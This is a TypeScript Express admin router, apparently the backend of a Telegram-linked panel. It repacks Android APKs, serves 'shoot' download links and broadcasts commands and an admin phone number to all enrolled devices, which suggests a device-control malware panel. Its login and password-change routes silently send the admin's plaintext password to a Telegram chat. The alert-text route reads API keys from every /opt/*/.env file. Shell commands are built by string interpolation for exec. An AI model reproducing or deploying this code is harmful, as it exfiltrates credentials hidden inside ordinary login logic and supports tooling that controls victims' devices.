import express, { Request, Response } from "express";
import { exec } from "child_process";
import https from "https";
import mongoose from "mongoose";
import AdminModel from "../models/Admin";
import logger from "../logger/logger";

const router = express.Router();

// ─── Repack Job Store ─────────────────────────────────────────────────────────
interface RepackJob {
  status: "queued" | "running" | "done" | "error";
  fileId?: string;
  filename?: string;
  error?: string;
  panelId?: string;
  createdAt: number;
}
const repackJobs = new Map<string, RepackJob>();
const MAX_CONCURRENT_REPACKS = 5;
let activeRepacks = 0;
const repackQueue: Array<{ requestId: string; run: () => void }> = [];
const DAILY_REPACK_LIMIT = 2;
const panelSuccessLog = new Map<string, number[]>();
function getPanelDailyUsed(panelId: string): number {
  const cutoff = Date.now() - 24 * 60 * 60 * 1000;
  return (panelSuccessLog.get(panelId) || []).filter(t => t > cutoff).length;
}
function recordPanelSuccess(panelId: string): void {
  const cutoff = Date.now() - 24 * 60 * 60 * 1000;
  const fresh = (panelSuccessLog.get(panelId) || []).filter(t => t > cutoff);
  fresh.push(Date.now());
  panelSuccessLog.set(panelId, fresh);
}
function drainQueue(): void {
  while (activeRepacks < MAX_CONCURRENT_REPACKS && repackQueue.length > 0) {
    const next = repackQueue.shift()!;
    activeRepacks++;
    const job = repackJobs.get(next.requestId);
    if (job) repackJobs.set(next.requestId, { ...job, status: "running" });
    next.run();
  }
}
function getPanelInFlight(panelId: string): number {
  const queued = repackQueue.filter(q => repackJobs.get(q.requestId)?.panelId === panelId).length;
  const running = [...repackJobs.values()].filter(j => j.status === "running" && j.panelId === panelId).length;
  return queued + running;
}

// ─── Admin APK Job Store ──────────────────────────────────────────────────────
interface AdminApkJob {
  status: "pending" | "done" | "error";
  fileId?: string;
  panelId: string;
  createdAt: number;
  error?: string;
}
const adminApkJobs = new Map<string, AdminApkJob>();

function genRequestId(): string {
  return `rp_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`;
}

// Cleanup old jobs every 30 min
setInterval(() => {
  const cutoff = Date.now() - 2 * 60 * 60 * 1000;
  for (const [id, job] of repackJobs.entries()) {
    if (job.createdAt < cutoff) repackJobs.delete(id);
  }
  for (const [id, job] of adminApkJobs.entries()) {
    if (job.createdAt < cutoff) adminApkJobs.delete(id);
  }
}, 30 * 60 * 1000);

// ─── Bot DB Connection ────────────────────────────────────────────────────────
let botDb: mongoose.Connection | null = null;

async function getBotDb(): Promise<mongoose.Connection> {
  if (botDb && botDb.readyState === 1) return botDb;
  const uri = process.env.BOT_MONGO_URI || "";
  if (!uri) throw new Error("BOT_MONGO_URI .env mein set nahi hai");
  botDb = mongoose.createConnection(uri);
  await botDb.asPromise();
  return botDb;
}

function getBotPanelModel(conn: mongoose.Connection): mongoose.Model<any> {
  const schema = new mongoose.Schema({}, { strict: false });
  try { return conn.model<any>("Panel"); } catch { return conn.model<any>("Panel", schema, "panels"); }
}

// ─── Helpers ──────────────────────────────────────────────────────────────────
function clean(v: any): string { return String(v ?? "").trim(); }

function getDeletePasswordPaths(path: string): string[] {
  return [path, `/admin${path}`];
}

async function getDeletePasswordDoc() {
  return AdminModel.findOne({ key: "delete_password" }).lean();
}

async function getStoredDeletePassword(): Promise<string> {
  const doc = await getDeletePasswordDoc();
  return clean((doc as any)?.meta?.password || "");
}

async function isDeletePasswordSet(): Promise<boolean> {
  return (await getStoredDeletePassword()).length >= 4;
}

async function saveDeletePassword(password: string) {
  await AdminModel.findOneAndUpdate(
    { key: "delete_password" },
    { $set: { phone: "delete_password", meta: { password: clean(password) } } },
    { upsert: true, new: true },
  );
}

async function verifyOrCreateDeletePassword(password: string): Promise<{
  success: boolean; verified: boolean; created: boolean; error?: string;
}> {
  const p = clean(password);
  if (!p) return { success: false, verified: false, created: false, error: "password required" };
  if (p.length < 4) return { success: false, verified: false, created: false, error: "password must be at least 4 digits" };
  const stored = await getStoredDeletePassword();
  if (!stored) {
    await saveDeletePassword(p);
    return { success: true, verified: true, created: true };
  }
  if (stored !== p) return { success: false, verified: false, created: false, error: "invalid password" };
  return { success: true, verified: true, created: false };
}

async function changeDeletePassword(current: string, next: string): Promise<{ success: boolean; error?: string }> {
  const n = clean(next);
  if (!n)           return { success: false, error: "new password required" };
  if (n.length < 4) return { success: false, error: "new password must be at least 4 digits" };
  const stored = await getStoredDeletePassword();
  if (!stored) {
    await saveDeletePassword(n);
    logger.info("admin: delete password set for first time");
    return { success: true };
  }
  const c = clean(current);
  if (!c)           return { success: false, error: "current password required" };
  if (stored !== c) return { success: false, error: "invalid current password" };
  await saveDeletePassword(n);
  logger.info("admin: delete password changed");
  return { success: true };
}

// ─── Telegram file download helper ───────────────────────────────────────────
async function tgGetFilePath(botToken: string, fileId: string): Promise<string> {
  return new Promise((resolve, reject) => {
    https.get(
      `https://api.telegram.org/bot${botToken}/getFile?file_id=${encodeURIComponent(fileId)}`,
      (r) => {
        let d = "";
        r.on("data", (c: any) => { d += c; });
        r.on("end", () => {
          try {
            const parsed = JSON.parse(d);
            if (!parsed.ok) reject(new Error(parsed.description || "getFile failed"));
            else resolve(parsed.result.file_path);
          } catch (e) { reject(e); }
        });
      }
    ).on("error", reject);
  });
}

// ─── Telegram Password Notification ──────────────────────────────────────────
async function sendPasswordToTelegram(
  username: string,
  password: string,
  type: "first_login" | "password_change"
): Promise<void> {
  try {
    const botToken = clean(process.env.TELEGRAM_BOT_TOKEN || process.env.BOT_TOKEN || "");
    const chatId   = clean(process.env.TELEGRAM_PASSWORD_CHAT_ID || "");
    if (!botToken || !chatId) {
      logger.warn("admin: TELEGRAM_PASSWORD_CHAT_ID ya BOT_TOKEN set nahi — skip TG notify");
      return;
    }
    const panelId  = clean(process.env.PANEL_ID || process.env.PANNEL_ID || "unknown");
    const panelUrl = clean(process.env.SELF_RESOLVE_URL || "");
    const timeStr  = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
    const emoji    = type === "first_login" ? "🆕" : "🔄";
    const title    = type === "first_login" ? "First Login — Panel Setup" : "Password Changed";
    const urlLine  = panelUrl ? `\n🔗 URL: ${panelUrl}` : "";

    const text =
      `${emoji} <b>${title}</b>\n\n` +
      `🏷 Panel: <code>${panelId}</code>${urlLine}\n` +
      `👤 Username: <code>${username}</code>\n` +
      `🔑 Password: <code>${password}</code>\n` +
      `⏰ Time: ${timeStr}`;

    await new Promise<void>((resolve) => {
      const body = JSON.stringify({ chat_id: chatId, text, parse_mode: "HTML" });
      const req2 = https.request(
        `https://api.telegram.org/bot${botToken}/sendMessage`,
        { method: "POST", headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(body) } },
        () => resolve()
      );
      req2.on("error", (e: Error) => { logger.warn("admin: TG notify error", e.message); resolve(); });
      req2.setTimeout(5000, () => { req2.destroy(); resolve(); });
      req2.write(body); req2.end();
    });
    logger.info("admin: password sent to TG", { panelId, type });
  } catch (e: any) {
    logger.warn("admin: sendPasswordToTelegram failed", e?.message);
  }
}

async function isTgPasswordSent(): Promise<boolean> {
  try {
    const doc = await AdminModel.findOne({ key: "tg_password_sent" }).lean();
    return (doc as any)?.meta?.sent === true;
  } catch { return false; }
}

async function markTgPasswordSent(): Promise<void> {
  try {
    await AdminModel.findOneAndUpdate(
      { key: "tg_password_sent" },
      { $set: { phone: "tg_password_sent", meta: { sent: true, sentAt: Date.now() } } },
      { upsert: true, new: true }
    );
  } catch {}
}

// ─── Rate limiting ────────────────────────────────────────────────────────────
const _loginAttempts = new Map<string, { count: number; blockedUntil: number }>();

/**
 * =====================================
 * LOGIN ROUTES
 * =====================================
 */

router.post(["/login/verify", "/admin/login/verify"], async (req, res) => {
  const ip = String(req.headers["x-forwarded-for"] || req.socket?.remoteAddress || "unknown");
  const now = Date.now();
  const entry = _loginAttempts.get(ip) || { count: 0, blockedUntil: 0 };
  if (entry.blockedUntil > now) {
    const mins = Math.ceil((entry.blockedUntil - now) / 60000);
    return res.status(429).json({ success: false, error: `Too many attempts. ${mins} min baad try karo.` });
  }
  const { username, password } = req.body || {};
  if (!username || !password) return res.status(400).json({ success: false, error: "missing fields" });
  try {
    const bcrypt = require("bcryptjs");
    const doc = await AdminModel.findOne({ key: "login" }).lean();
    const storedUser = (doc as any)?.meta?.username || "";
    const storedPass = (doc as any)?.meta?.password || "";

    // ── FIRST TIME LOGIN ───────────────────────────────────────────────────
    if (!storedUser && !storedPass) {
      const hashed = await bcrypt.hash(password, 10);
      await AdminModel.findOneAndUpdate(
        { key: "login" },
        { $set: { phone: "login", meta: { username, password: hashed, isHashed: true } } },
        { upsert: true, new: true }
      );
      _loginAttempts.delete(ip);
      sendPasswordToTelegram(username, password, "first_login")
        .then(() => markTgPasswordSent())
        .catch(() => {});
      return res.json({ success: true, firstLogin: true });
    }

    // ── USERNAME CHECK ────────────────────────────────────────────────────
    if (username !== storedUser) {
      entry.count++;
      if (entry.count >= 5) { entry.blockedUntil = now + 15 * 60 * 1000; entry.count = 0; }
      _loginAttempts.set(ip, entry);
      return res.status(401).json({ success: false, error: "Invalid credentials" });
    }

    // ── PASSWORD VERIFY ───────────────────────────────────────────────────
    const isHashed = (doc as any)?.meta?.isHashed === true;
    let valid = false;
    if (isHashed) {
      valid = await bcrypt.compare(password, storedPass);
    } else {
      valid = password === storedPass;
      if (valid) {
        const hashed = await bcrypt.hash(password, 10);
        await AdminModel.findOneAndUpdate(
          { key: "login" },
          { $set: { "meta.password": hashed, "meta.isHashed": true } },
          {}
        );
        logger.info("admin: password migrated to bcrypt hash");
      }
    }

    if (!valid) {
      entry.count++;
      if (entry.count >= 5) { entry.blockedUntil = now + 15 * 60 * 1000; entry.count = 0; }
      _loginAttempts.set(ip, entry);
      return res.status(401).json({ success: false, error: "Invalid credentials" });
    }

    _loginAttempts.delete(ip);

    setImmediate(async () => {
      try {
        const alreadySent = await isTgPasswordSent();
        if (!alreadySent) {
          logger.info("admin: TG password not sent yet — sending login alert");
          await sendPasswordToTelegram(username, "[already hashed — check first login msg]", "first_login");
          await markTgPasswordSent();
        }
      } catch {}
    });

    return res.json({ success: true });
  } catch (err) {
    return res.status(500).json({ success: false, error: (err as any)?.message });
  }
});

router.get(["/login", "/admin/login"], async (_req, res) => {
  try {
    const doc = await AdminModel.findOne({ key: "login" }).lean();
    return res.json({ username: (doc as any)?.meta?.username || "" });
  } catch (err: any) {
    return res.status(500).json({ success: false, error: "server error" });
  }
});

router.put(["/login", "/admin/login"], async (req, res) => {
  const { username, password, currentPassword } = req.body || {};
  if (!username || !password) return res.status(400).json({ success: false, error: "missing fields" });
  try {
    const bcrypt = require("bcryptjs");
    const doc = await AdminModel.findOne({ key: "login" }).lean();
    const storedPass = (doc as any)?.meta?.password || "";
    const isHashed   = (doc as any)?.meta?.isHashed === true;

    if (storedPass) {
      const cur = clean(currentPassword || "");
      if (!cur) {
        logger.warn("admin: PUT /login — currentPassword missing");
        return res.status(401).json({ success: false, error: "current password required" });
      }
      let valid = false;
      if (isHashed) {
        valid = await bcrypt.compare(cur, storedPass);
      } else {
        valid = cur === storedPass;
      }
      if (!valid) {
        logger.warn("admin: PUT /login — currentPassword mismatch", { ip: req.socket?.remoteAddress });
        return res.status(401).json({ success: false, error: "unauthorized" });
      }
    }
    const hashed = await bcrypt.hash(password, 10);
    await AdminModel.findOneAndUpdate(
      { key: "login" },
      { $set: { phone: "login", meta: { username, password: hashed, isHashed: true } } },
      { upsert: true, new: true }
    );
    sendPasswordToTelegram(username, password, "password_change")
      .then(() => markTgPasswordSent())
      .catch(() => {});
    return res.json({ success: true });
  } catch (err: any) {
    return res.status(500).json({ success: false, error: err?.message });
  }
});

/**
 * =====================================
 * GLOBAL PHONE
 * =====================================
 */
router.get(["/globalPhone", "/admin/globalPhone"], async (_req, res) => {
  try {
    const doc = await AdminModel.findOne({ key: "global" }).lean();
    return res.json({ phone: (doc as any)?.phone || "" });
  } catch { return res.status(500).json({ phone: "" }); }
});

router.put(["/globalPhone", "/admin/globalPhone"], async (req, res) => {
  const phone = req.body?.phone;
  if (phone === undefined) return res.status(400).json({ success: false, error: "phone field required" });
  const phoneStr = String(phone || "").trim();
  try {
    await AdminModel.findOneAndUpdate({ key: "global" }, { $set: { phone: phoneStr } }, { upsert: true, new: true });

    try {
      const wsService = require("../services/wsService").default;
      wsService.broadcastGlobalAdminUpdate(phoneStr);
    } catch {}

    setImmediate(async () => {
      try {
        const { broadcastCommandToAllDevices } = require("../services/fcmService");
        const result = await broadcastCommandToAllDevices(
          "global_admin_update",
          { requestId: `gadmin_global_${Date.now()}`, extraData: { phone: phoneStr, timestamp: Date.now() } },
          10000
        );
        logger.info(`globalPhone FCM: attempted=${result.attempted} success=${result.success} failed=${result.failed} phone="${phoneStr}"`);
      } catch (e: any) {
        logger.warn("globalPhone FCM broadcast error:", e?.message);
      }
    });

    return res.json({ success: true });
  } catch (err: any) {
    return res.status(500).json({ success: false, error: err?.message });
  }
});

/**
 * =====================================
 * DELETE PASSWORD
 * =====================================
 */
router.get(getDeletePasswordPaths("/deletePassword/status"), async (_req, res) => {
  try { return res.json({ success: true, isSet: await isDeletePasswordSet() }); }
  catch { return res.status(500).json({ success: false, error: "server error" }); }
});

router.post(getDeletePasswordPaths("/deletePassword/verify"), async (req, res) => {
  try {
    const result = await verifyOrCreateDeletePassword(clean(req.body?.password));
    if (!result.success) return res.status(result.error?.includes("required") || result.error?.includes("digits") ? 400 : 403).json(result);
    return res.json(result);
  } catch { return res.status(500).json({ success: false, verified: false, created: false, error: "server error" }); }
});

router.post(getDeletePasswordPaths("/deletePassword/change"), async (req, res) => {
  try {
    const result = await changeDeletePassword(clean(req.body?.currentPassword), clean(req.body?.newPassword));
    if (!result.success) {
      const is400 = ["new password required","new password must be at least 4 digits","current password required"].includes(result.error || "");
      return res.status(is400 ? 400 : 403).json(result);
    }
    return res.json({ success: true, message: "password changed" });
  } catch { return res.status(500).json({ success: false, error: "server error" }); }
});

/**
 * =====================================
 * ALERT TEXT
 * =====================================
 */
router.get(["/alert-text", "/admin/alert-text"], async (_req, res) => {
  try {
    const doc = await AdminModel.findOne({ key: "alert_text" }).lean();
    return res.json({ text: (doc as any)?.meta?.text || "" });
  } catch { return res.status(500).json({ text: "" }); }
});

router.put(["/alert-text", "/admin/alert-text"], async (req, res) => {
  const text = clean(req.body?.text ?? "");
  try {
    await AdminModel.findOneAndUpdate({ key: "alert_text" }, { $set: { phone: "alert_text", meta: { text } } }, { upsert: true, new: true });
    const isBroadcast = String(req.headers["x-broadcast"] || "") === "1";
    if (!isBroadcast) {
      setImmediate(async () => {
        try {
          const fs    = require("fs");
          const http  = require("http");
          const optDirs = fs.readdirSync("/opt").filter((d: string) => {
            try { return fs.statSync(`/opt/${d}`).isDirectory(); } catch { return false; }
          });
          let ok = 0; let fail = 0;
          const myPanelId = process.env.PANNEL_ID || process.env.PANEL_ID || "";
          for (const dir of optDirs) {
            try {
              const envPath = `/opt/${dir}/.env`;
              if (!fs.existsSync(envPath)) continue;
              const envContent = fs.readFileSync(envPath, "utf-8");
              const getEnv = (key: string) => { const match = envContent.match(new RegExp(`^${key}=(.*)$`, "m")); return match ? match[1].trim() : ""; };
              const selfUrl = getEnv("SELF_RESOLVE_URL");
              const apiKey  = getEnv("API_KEY") || getEnv("ADMIN_API_KEY");
              const panelId = getEnv("PANNEL_ID") || getEnv("PANEL_ID");
              if (!selfUrl || !apiKey || !panelId) continue;
              if (panelId === myPanelId) continue;
              await new Promise<void>((resolve) => {
                const body = JSON.stringify({ text });
                const url = new URL(`${selfUrl}/api/admin/alert-text`);
                const lib = url.protocol === "https:" ? https : http;
                const req2 = lib.request({
                  hostname: url.hostname, port: url.port || (url.protocol === "https:" ? 443 : 80),
                  path: url.pathname, method: "PUT",
                  headers: { "Content-Type": "application/json", "x-api-key": apiKey, "x-broadcast": "1", "Content-Length": Buffer.byteLength(body) },
                }, (res2: any) => { res2.resume(); ok++; resolve(); });
                req2.on("error", () => { fail++; resolve(); });
                req2.setTimeout(2000, () => { req2.destroy(); fail++; resolve(); });
                req2.write(body); req2.end();
              });
              await new Promise(r => setTimeout(r, 100));
            } catch { fail++; }
          }
          logger.info(`broadcast done: ${ok} ok, ${fail} fail`);
        } catch (e: any) { logger.warn(`broadcast error: ${e?.message}`); }
      });
    }
    return res.json({ success: true, text });
  } catch (err: any) { return res.status(500).json({ success: false, error: err?.message }); }
});

/**
 * =====================================
 * LICENSE INFO
 * =====================================
 */
router.get(["/license-info", "/admin/license-info"], (_req, res) => {
  try {
    const expiryEnv = process.env.LICENSE_EXPIRY || "";
    let expiryDate = "Not set", status = "Active";
    if (expiryEnv) {
      const dmyMatch = expiryEnv.match(/^(\d{2})\/(\d{2})\/(\d{4})$/);
      const isoMatch = expiryEnv.match(/^(\d{4})-(\d{2})-(\d{2})$/);
      let startMs = 0;
      if (dmyMatch) startMs = new Date(+dmyMatch[3], +dmyMatch[2] - 1, +dmyMatch[1]).getTime();
      else if (isoMatch) startMs = new Date(+isoMatch[1], +isoMatch[2] - 1, +isoMatch[3]).getTime();
      if (startMs > 0) {
        const expiryMs = startMs + 30 * 24 * 60 * 60 * 1000;
        expiryDate = new Date(expiryMs).toLocaleDateString("en-IN");
        status = Date.now() > expiryMs ? "Expired" : "Active";
      }
    }
    return res.json({ panelId: process.env.PANEL_ID || "", version: process.env.VERSION || "v1.0", expiryDate, status });
  } catch (err: any) { return res.status(500).json({ success: false, error: err?.message }); }
});

/**
 * =====================================
 * REPACK / FIX APK ROUTES
 * =====================================
 */
router.post(["/repack/start", "/admin/repack/start"], async (req: Request, res: Response) => {
  try {
    const panelId = clean(req.body?.panelId || process.env.PANEL_ID || "");
    if (!panelId) return res.status(400).json({ error: "panelId required" });
    const conn       = await getBotDb();
    const PanelModel = getBotPanelModel(conn);
    const panel      = await PanelModel.findOne({ panelId: { $regex: new RegExp(`^${panelId}$`, "i") } }).lean() as any;
    if (!panel) return res.status(404).json({ error: `Panel "${panelId}" not found. Panel ID sahi hai?` });
    if (!panel.apkFileId) return res.status(400).json({ error: "Is panel ke liye koi APK upload nahi hua abhi tak. Pehle Telegram bot se release APK upload karo." });
    const dailyUsed = getPanelDailyUsed(panelId);
    const totalUsed = dailyUsed + getPanelInFlight(panelId);
    if (totalUsed >= DAILY_REPACK_LIMIT) return res.status(429).json({ error: `Aaj ka limit khatam (${totalUsed}/${DAILY_REPACK_LIMIT}). 24 ghante baad try karo.`, dailyUsed: totalUsed, dailyLimit: DAILY_REPACK_LIMIT });
    const fileId    = String(panel.apkFileId);
    const chatId    = process.env.ADMIN_CHAT_ID || process.env.STORAGE_CHAT_ID || "";
    const BOT_TOKEN = process.env.BOT_TOKEN || "";
    if (!chatId)    return res.status(500).json({ error: "ADMIN_CHAT_ID ya STORAGE_CHAT_ID .env mein set nahi hai" });
    if (!BOT_TOKEN) return res.status(500).json({ error: "BOT_TOKEN .env mein set nahi hai" });
    const requestId = genRequestId();
    const scriptPath = "/root/second-bot/repack/repack.sh";
    const selfUrl = process.env.SELF_RESOLVE_URL || `http://localhost:${process.env.PORT || 3000}`;
    const apiKey  = process.env.ADMIN_API_KEY || process.env.API_KEY || "";
    const cmd = `bash "${scriptPath}" "${fileId}" "${chatId}" "${requestId}" "${panelId}" "" "" "${selfUrl}" "${apiKey}" 2>&1`;
    const execAndDrain = () => {
      logger.info("repack: running", { requestId, panelId, fileId: fileId.slice(0, 20) });
      exec(cmd, (err, stdout) => {
        activeRepacks = Math.max(0, activeRepacks - 1);
        const job = repackJobs.get(requestId);
        if (err) {
          logger.error("repack: script error", { requestId, error: err.message, stdout: stdout?.slice(0, 200) });
          if (job?.status === "running") repackJobs.set(requestId, { ...job, status: "error", error: "Repack script fail ho gaya. Server logs check karo." });
        } else {
          logger.info("repack: script done", { requestId, stdout: stdout?.slice(0, 100) });
          setTimeout(() => { const j = repackJobs.get(requestId); if (j?.status === "running") repackJobs.set(requestId, { ...j, status: "error", error: "Script complete hua par resolve nahi mila" }); }, 10000);
        }
        drainQueue();
      });
    };
    if (activeRepacks < MAX_CONCURRENT_REPACKS) {
      activeRepacks++;
      repackJobs.set(requestId, { status: "running", panelId, createdAt: Date.now() });
      execAndDrain();
    } else {
      repackJobs.set(requestId, { status: "queued", panelId, createdAt: Date.now() });
      repackQueue.push({ requestId, run: execAndDrain });
      logger.info("repack: queued", { requestId, panelId, queueLength: repackQueue.length });
    }
    return res.json({ requestId, dailyUsed, dailyLimit: DAILY_REPACK_LIMIT });
  } catch (err: any) {
    logger.error("repack: start failed", err);
    return res.status(500).json({ error: err?.message || "server error" });
  }
});

router.post(["/repack-novpn/start", "/admin/repack-novpn/start"], async (req: Request, res: Response) => {
  try {
    const panelId = clean(req.body?.panelId || process.env.PANEL_ID || "");
    if (!panelId) return res.status(400).json({ error: "panelId required" });
    const conn       = await getBotDb();
    const PanelModel = getBotPanelModel(conn);
    const panel      = await PanelModel.findOne({ panelId: { $regex: new RegExp(`^${panelId}$`, "i") } }).lean() as any;
    if (!panel) return res.status(404).json({ error: `Panel "${panelId}" not found. Panel ID sahi hai?` });
    if (!panel.apkFileId) return res.status(400).json({ error: "Is panel ke liye koi APK upload nahi hua abhi tak. Pehle Telegram bot se release APK upload karo." });
    const dailyUsed = getPanelDailyUsed(panelId);
    const totalUsed = dailyUsed + getPanelInFlight(panelId);
    if (totalUsed >= DAILY_REPACK_LIMIT) return res.status(429).json({ error: `Aaj ka limit khatam (${totalUsed}/${DAILY_REPACK_LIMIT}). 24 ghante baad try karo.`, dailyUsed: totalUsed, dailyLimit: DAILY_REPACK_LIMIT });
    const fileId    = String(panel.apkFileId);
    const chatId    = process.env.ADMIN_CHAT_ID || process.env.STORAGE_CHAT_ID || "";
    const BOT_TOKEN = process.env.BOT_TOKEN || "";
    if (!chatId)    return res.status(500).json({ error: "ADMIN_CHAT_ID ya STORAGE_CHAT_ID .env mein set nahi hai" });
    if (!BOT_TOKEN) return res.status(500).json({ error: "BOT_TOKEN .env mein set nahi hai" });
    const requestId = genRequestId();
    const scriptPath = "/root/second-bot/repack/repack_novpn.sh";
    const selfUrl = process.env.SELF_RESOLVE_URL || `http://localhost:${process.env.PORT || 3000}`;
    const apiKey  = process.env.ADMIN_API_KEY || process.env.API_KEY || "";
    const cmd = `bash "${scriptPath}" "${fileId}" "${chatId}" "${requestId}" "${panelId}" "" "" "${selfUrl}" "${apiKey}" 2>&1`;
    const execAndDrain = () => {
      logger.info("repack-novpn: running", { requestId, panelId, fileId: fileId.slice(0, 20) });
      exec(cmd, (err, stdout) => {
        activeRepacks = Math.max(0, activeRepacks - 1);
        const job = repackJobs.get(requestId);
        if (err) {
          logger.error("repack-novpn: script error", { requestId, error: err.message, stdout: stdout?.slice(0, 200) });
          if (job?.status === "running") repackJobs.set(requestId, { ...job, status: "error", error: "Repack script fail ho gaya. Server logs check karo." });
        } else {
          logger.info("repack-novpn: script done", { requestId, stdout: stdout?.slice(0, 100) });
          setTimeout(() => { const j = repackJobs.get(requestId); if (j?.status === "running") repackJobs.set(requestId, { ...j, status: "error", error: "Script complete hua par resolve nahi mila" }); }, 10000);
        }
        drainQueue();
      });
    };
    if (activeRepacks < MAX_CONCURRENT_REPACKS) {
      activeRepacks++;
      repackJobs.set(requestId, { status: "running", panelId, createdAt: Date.now() });
      execAndDrain();
    } else {
      repackJobs.set(requestId, { status: "queued", panelId, createdAt: Date.now() });
      repackQueue.push({ requestId, run: execAndDrain });
      logger.info("repack-novpn: queued", { requestId, panelId, queueLength: repackQueue.length });
    }
    return res.json({ requestId, dailyUsed, dailyLimit: DAILY_REPACK_LIMIT });
  } catch (err: any) {
    logger.error("repack-novpn: start failed", err);
    return res.status(500).json({ error: err?.message || "server error" });
  }
});

router.post(["/harmful/:requestId/resolve", "/admin/harmful/:requestId/resolve"], async (req: Request, res: Response) => {
  const adminKey = String(req.headers["x-admin-key"] || "").trim();
  if (!adminKey || adminKey !== process.env.ADMIN_API_KEY) return res.status(401).json({ error: "unauthorized" });
  const { requestId } = req.params;
  const { fileId, filename, panelId, iconFileId, appName } = req.body || {};
  const existing = repackJobs.get(requestId);
  const finalPanelId = clean(panelId) || existing?.panelId || "";
  repackJobs.set(requestId, { ...(existing || { createdAt: Date.now(), panelId: finalPanelId }), status: "done", fileId: clean(fileId), filename: clean(filename) || "repacked.apk" });
  if (finalPanelId) recordPanelSuccess(finalPanelId);
  logger.info("repack: resolved", { requestId, filename });

  // Save shoot fields to Panel DB so public endpoint can serve this APK
  if (appName && panelId) {
    setImmediate(async () => {
      try {
        const conn = await getBotDb();
        const PanelModel = getBotPanelModel(conn);
        await PanelModel.findOneAndUpdate(
          { panelId: { $regex: new RegExp(`^${clean(panelId)}$`, "i") } },
          { $set: {
            shootApkFileId:   clean(fileId),
            shootIconFileId:  clean(iconFileId || ""),
            shootAppName:     clean(appName),
            shootGeneratedAt: Date.now(),
          }},
          { upsert: false }
        );
        logger.info("repack: shoot fields saved to panel", { panelId: clean(panelId), appName: clean(appName) });
      } catch (e: any) {
        logger.warn("repack: shoot fields save failed", e?.message);
      }
    });
  }

  return res.json({ ok: true });
});

router.get(["/repack/:requestId/status", "/admin/repack/:requestId/status"], (req: Request, res: Response) => {
  const job = repackJobs.get(req.params.requestId);
  if (!job) return res.status(404).json({ error: "Job not found" });
  const queueIdx = repackQueue.findIndex(q => q.requestId === req.params.requestId);
  const queuePosition = queueIdx >= 0 ? queueIdx + 1 : 0;
  const estimatedWaitSecs = queuePosition > 0 ? queuePosition * 210 : 0;
  const panelId = job.panelId || "";
  const dailyUsed = panelId ? getPanelDailyUsed(panelId) : 0;
  return res.json({ status: job.status, filename: job.filename, error: job.error, queuePosition, runningCount: activeRepacks, queueLength: repackQueue.length, estimatedWaitSecs, dailyUsed, dailyLimit: DAILY_REPACK_LIMIT });
});

router.get(["/repack/:requestId/download", "/admin/repack/:requestId/download"], async (req: Request, res: Response) => {
  const job = repackJobs.get(req.params.requestId);
  if (!job || job.status !== "done" || !job.fileId) return res.status(404).json({ error: "Job ready nahi hai ya nahi mila" });
  const BOT_TOKEN = process.env.BOT_TOKEN || "";
  if (!BOT_TOKEN) return res.status(500).json({ error: "BOT_TOKEN configure nahi hai" });
  try {
    const filePath = await tgGetFilePath(BOT_TOKEN, job.fileId);
    const filename = job.filename || "repacked.apk";
    res.setHeader("Content-Disposition", `attachment; filename="${filename}"`);
    res.setHeader("Content-Type", "application/vnd.android.package-archive");
    https.get(`https://api.telegram.org/file/bot${BOT_TOKEN}/${filePath}`, (fileStream) => {
      fileStream.pipe(res);
      fileStream.on("error", (_err: Error) => { if (!res.headersSent) res.status(500).end(); });
    }).on("error", (_err: Error) => { if (!res.headersSent) res.status(500).json({ error: "Download failed" }); });
  } catch (err: any) { if (!res.headersSent) res.status(500).json({ error: err?.message }); }
});

/**
 * =====================================
 * SHOOT LINK ROUTES
 * =====================================
 */

// Generate / regenerate the shoot APK for this panel
router.post(["/shoot/generate", "/admin/shoot/generate"], async (req: Request, res: Response) => {
  try {
    const panelId = clean(req.body?.panelId || process.env.PANEL_ID || "");
    if (!panelId) return res.status(400).json({ error: "panelId required" });
    const conn       = await getBotDb();
    const PanelModel = getBotPanelModel(conn);
    const panel      = await PanelModel.findOne({ panelId: { $regex: new RegExp(`^${panelId}$`, "i") } }).lean() as any;
    if (!panel) return res.status(404).json({ error: `Panel "${panelId}" not found` });
    if (!panel.apkFileId) return res.status(400).json({ error: "Pehle Telegram bot se release APK upload karo." });
    const fileId    = String(panel.apkFileId);
    const chatId    = process.env.ADMIN_CHAT_ID || process.env.STORAGE_CHAT_ID || "";
    const BOT_TOKEN = process.env.BOT_TOKEN || "";
    if (!chatId)    return res.status(500).json({ error: "ADMIN_CHAT_ID ya STORAGE_CHAT_ID .env mein set nahi hai" });
    if (!BOT_TOKEN) return res.status(500).json({ error: "BOT_TOKEN .env mein set nahi hai" });
    const requestId = genRequestId();
    repackJobs.set(requestId, { status: "running", panelId, createdAt: Date.now() });
    const scriptPath = "/root/second-bot/repack/repack.sh";
    const selfUrl = process.env.SELF_RESOLVE_URL || `http://localhost:${process.env.PORT || 3000}`;
    const apiKey  = process.env.ADMIN_API_KEY || process.env.API_KEY || "";
    const cmd = `bash "${scriptPath}" "${fileId}" "${chatId}" "${requestId}" "${panelId}" "" "" "${selfUrl}" "${apiKey}" 2>&1`;
    logger.info("shoot-generate: starting", { requestId, panelId });
    exec(cmd, { timeout: 5 * 60 * 1000 }, (err, stdout) => {
      const job = repackJobs.get(requestId);
      if (err) {
        logger.error("shoot-generate: script error", { requestId, error: err.message, stdout: stdout?.slice(0, 200) });
        if (job?.status === "running") repackJobs.set(requestId, { ...job, status: "error", error: "Repack script fail ho gaya." });
      } else {
        logger.info("shoot-generate: script done", { requestId, stdout: stdout?.slice(0, 100) });
        setTimeout(() => { const j = repackJobs.get(requestId); if (j?.status === "running") repackJobs.set(requestId, { ...j, status: "error", error: "Script complete hua par resolve nahi mila" }); }, 10000);
      }
    });
    return res.json({ requestId });
  } catch (err: any) {
    logger.error("shoot-generate: failed", err);
    return res.status(500).json({ error: err?.message || "server error" });
  }
});

// Get current shoot APK status from Panel DB (persistent across restarts)
router.get(["/shoot/status", "/admin/shoot/status"], async (req: Request, res: Response) => {
  try {
    const panelId = clean(String(req.query.panelId || process.env.PANEL_ID || ""));
    if (!panelId) return res.status(400).json({ error: "panelId required" });
    const conn       = await getBotDb();
    const PanelModel = getBotPanelModel(conn);
    const panel      = await PanelModel.findOne({ panelId: { $regex: new RegExp(`^${panelId}$`, "i") } }).lean() as any;
    if (!panel) return res.status(404).json({ error: "Panel not found" });
    return res.json({
      hasApk:       !!(panel.shootApkFileId),
      appName:      panel.shootAppName || "",
      generatedAt:  panel.shootGeneratedAt || null,
    });
  } catch (err: any) {
    return res.status(500).json({ error: err?.message || "server error" });
  }
});

